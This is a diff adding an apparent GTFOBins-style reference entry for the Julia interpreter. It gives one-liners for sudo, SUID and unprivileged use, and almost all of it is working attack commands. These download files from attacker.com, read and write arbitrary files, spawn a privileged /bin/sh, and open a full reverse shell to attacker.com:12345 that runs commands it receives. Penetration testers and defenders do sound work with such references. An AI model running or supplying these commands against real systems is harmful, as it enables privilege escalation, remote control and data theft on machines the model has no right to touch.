@@ -1,0 +1,62 @@
+julia
+=====
+
+Download
+--------
+
+[Sudo]
+    julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+
+[SUID]
+    julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+
+[Unprivileged]
+    julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+
+File read
+---------
+
+[Sudo]
+    julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
+
+[SUID]
+    julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
+
+[Unprivileged]
+    julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
+
+File write
+----------
+
+[Sudo]
+    julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
+
+[SUID]
+    julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
+
+[Unprivileged]
+    julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
+
+Reverse shell
+-------------
+
+[Sudo]
+    julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
+
+[SUID]
+    julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
+
+[Unprivileged]
+    julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
+
+Shell
+-----
+
+[Sudo]
+    julia -e 'run(`/bin/sh`)'
+
+[SUID]
+    julia -e 'run(`/bin/sh -p`)'
+
+[Unprivileged]
+    julia -e 'run(`/bin/sh`)'
